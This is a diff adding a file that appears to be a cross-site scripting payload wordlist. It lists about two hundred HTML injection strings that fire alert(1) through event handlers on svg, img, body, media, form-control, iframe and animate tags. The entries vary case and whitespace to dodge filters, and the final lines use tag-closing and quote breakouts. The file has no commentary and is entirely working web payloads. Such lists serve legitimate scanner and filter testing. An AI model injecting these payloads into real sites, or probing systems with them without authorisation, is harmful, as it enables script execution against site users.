@@ -1,0 +1,206 @@
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg  onload=alert(1) >
+<svg	onload=alert(1)>
+<svg onload = alert(1)>
+<SVG onload=alert(1)>
+<Svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<img  src=x onerror=alert(1) >
+<img	src=x onerror=alert(1)>
+<img src = x onerror = alert(1)>
+<IMG src=x onerror=alert(1)>
+<Img src=x onerror=alert(1)>
+<img src=x: onerror=alert(1)>
+<img/src=x: onerror=alert(1)>
+<img  src=x: onerror=alert(1) >
+<img	src=x: onerror=alert(1)>
+<img src = x: onerror = alert(1)>
+<IMG src=x: onerror=alert(1)>
+<Img src=x: onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<image/src=x onerror=alert(1)>
+<image  src=x onerror=alert(1) >
+<image	src=x onerror=alert(1)>
+<image src = x onerror = alert(1)>
+<IMAGE src=x onerror=alert(1)>
+<Image src=x onerror=alert(1)>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<body  onload=alert(1) >
+<body	onload=alert(1)>
+<body onload = alert(1)>
+<BODY onload=alert(1)>
+<Body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body/onpageshow=alert(1)>
+<body  onpageshow=alert(1) >
+<body	onpageshow=alert(1)>
+<body onpageshow = alert(1)>
+<BODY onpageshow=alert(1)>
+<Body onpageshow=alert(1)>
+<svg onload=alert(1)//>
+<svg/onload=alert(1)//>
+<svg  onload=alert(1)// >
+<svg	onload=alert(1)//>
+<svg onload = alert(1)//>
+<SVG onload=alert(1)//>
+<Svg onload=alert(1)//>
+<video src=x onerror=alert(1)>
+<video/src=x onerror=alert(1)>
+<video  src=x onerror=alert(1) >
+<video	src=x onerror=alert(1)>
+<video src = x onerror = alert(1)>
+<VIDEO src=x onerror=alert(1)>
+<Video src=x onerror=alert(1)>
+<video ><source onerror=alert(1)>
+<video/><source onerror=alert(1)>
+<video  ><source onerror=alert(1) >
+<video	><source onerror=alert(1)>
+<video ><source onerror = alert(1)>
+<VIDEO ><source onerror=alert(1)>
+<Video ><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<audio/src=x onerror=alert(1)>
+<audio  src=x onerror=alert(1) >
+<audio	src=x onerror=alert(1)>
+<audio src = x onerror = alert(1)>
+<AUDIO src=x onerror=alert(1)>
+<Audio src=x onerror=alert(1)>
+<audio ><source onerror=alert(1)>
+<audio/><source onerror=alert(1)>
+<audio  ><source onerror=alert(1) >
+<audio	><source onerror=alert(1)>
+<audio ><source onerror = alert(1)>
+<AUDIO ><source onerror=alert(1)>
+<Audio ><source onerror=alert(1)>
+<object data=x onerror=alert(1)>
+<object/data=x onerror=alert(1)>
+<object  data=x onerror=alert(1) >
+<object	data=x onerror=alert(1)>
+<object data = x onerror = alert(1)>
+<OBJECT data=x onerror=alert(1)>
+<Object data=x onerror=alert(1)>
+<embed src=x onerror=alert(1)>
+<embed/src=x onerror=alert(1)>
+<embed  src=x onerror=alert(1) >
+<embed	src=x onerror=alert(1)>
+<embed src = x onerror = alert(1)>
+<EMBED src=x onerror=alert(1)>
+<Embed src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<details/open ontoggle=alert(1)>
+<details  open ontoggle=alert(1) >
+<details	open ontoggle=alert(1)>
+<details open ontoggle = alert(1)>
+<DETAILS open ontoggle=alert(1)>
+<Details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<marquee/onstart=alert(1)>
+<marquee  onstart=alert(1) >
+<marquee	onstart=alert(1)>
+<marquee onstart = alert(1)>
+<MARQUEE onstart=alert(1)>
+<Marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input/autofocus onfocus=alert(1)>
+<input  autofocus onfocus=alert(1) >
+<input	autofocus onfocus=alert(1)>
+<input autofocus onfocus = alert(1)>
+<INPUT autofocus onfocus=alert(1)>
+<Input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<select/autofocus onfocus=alert(1)>
+<select  autofocus onfocus=alert(1) >
+<select	autofocus onfocus=alert(1)>
+<select autofocus onfocus = alert(1)>
+<SELECT autofocus onfocus=alert(1)>
+<Select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<textarea/autofocus onfocus=alert(1)>
+<textarea  autofocus onfocus=alert(1) >
+<textarea	autofocus onfocus=alert(1)>
+<textarea autofocus onfocus = alert(1)>
+<TEXTAREA autofocus onfocus=alert(1)>
+<Textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<keygen/autofocus onfocus=alert(1)>
+<keygen  autofocus onfocus=alert(1) >
+<keygen	autofocus onfocus=alert(1)>
+<keygen autofocus onfocus = alert(1)>
+<KEYGEN autofocus onfocus=alert(1)>
+<Keygen autofocus onfocus=alert(1)>
+<iframe onload=alert(1)>
+<iframe/onload=alert(1)>
+<iframe  onload=alert(1) >
+<iframe	onload=alert(1)>
+<iframe onload = alert(1)>
+<IFRAME onload=alert(1)>
+<Iframe onload=alert(1)>
+<iframe src=x onerror=alert(1)>
+<iframe/src=x onerror=alert(1)>
+<iframe  src=x onerror=alert(1) >
+<iframe	src=x onerror=alert(1)>
+<iframe src = x onerror = alert(1)>
+<IFRAME src=x onerror=alert(1)>
+<Iframe src=x onerror=alert(1)>
+<script src=x onerror=alert(1)>
+<script/src=x onerror=alert(1)>
+<script  src=x onerror=alert(1) >
+<script	src=x onerror=alert(1)>
+<script src = x onerror = alert(1)>
+<SCRIPT src=x onerror=alert(1)>
+<Script src=x onerror=alert(1)>
+<style onload=alert(1)>
+<style/onload=alert(1)>
+<style  onload=alert(1) >
+<style	onload=alert(1)>
+<style onload = alert(1)>
+<STYLE onload=alert(1)>
+<Style onload=alert(1)>
+<svg ><animate onbegin=alert(1) attributeName=x dur=1s>>
+<svg/><animate onbegin=alert(1) attributeName=x dur=1s>>
+<svg  ><animate onbegin=alert(1) attributeName=x dur=1s> >
+<svg	><animate onbegin=alert(1) attributeName=x dur=1s>>
+<svg ><animate onbegin = alert(1) attributeName = x dur = 1s>>
+<SVG ><animate onbegin=alert(1) attributeName=x dur=1s>>
+<Svg ><animate onbegin=alert(1) attributeName=x dur=1s>>
+<svg ><set onbegin=alert(1) attributeName=x>>
+<svg/><set onbegin=alert(1) attributeName=x>>
+<svg  ><set onbegin=alert(1) attributeName=x> >
+<svg	><set onbegin=alert(1) attributeName=x>>
+<svg ><set onbegin = alert(1) attributeName = x>>
+<SVG ><set onbegin=alert(1) attributeName=x>>
+<Svg ><set onbegin=alert(1) attributeName=x>>
+<form ><button formaction=javascript:alert(1)>x>
+<form/><button formaction=javascript:alert(1)>x>
+<form  ><button formaction=javascript:alert(1)>x >
+<form	><button formaction=javascript:alert(1)>x>
+<form ><button formaction = javascript:alert(1)>x>
+<FORM ><button formaction=javascript:alert(1)>x>
+<Form ><button formaction=javascript:alert(1)>x>
+</title><svg onload=alert(1)>
+</title><img src=x onerror=alert(1)>
+</textarea><svg onload=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+</style><svg onload=alert(1)>
+</style><img src=x onerror=alert(1)>
+</script><svg onload=alert(1)>
+</script><img src=x onerror=alert(1)>
+</noscript><svg onload=alert(1)>
+</noscript><img src=x onerror=alert(1)>
+</xmp><svg onload=alert(1)>
+</xmp><img src=x onerror=alert(1)>
+</iframe><svg onload=alert(1)>
+</iframe><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><svg onload=alert(1)>
+'><img src=x onerror=alert(1)>
+</select><svg onload=alert(1)>
+</select><img src=x onerror=alert(1)>
+--><svg onload=alert(1)>
+--><img src=x onerror=alert(1)>
+</template><svg onload=alert(1)>
+</template><img src=x onerror=alert(1)>
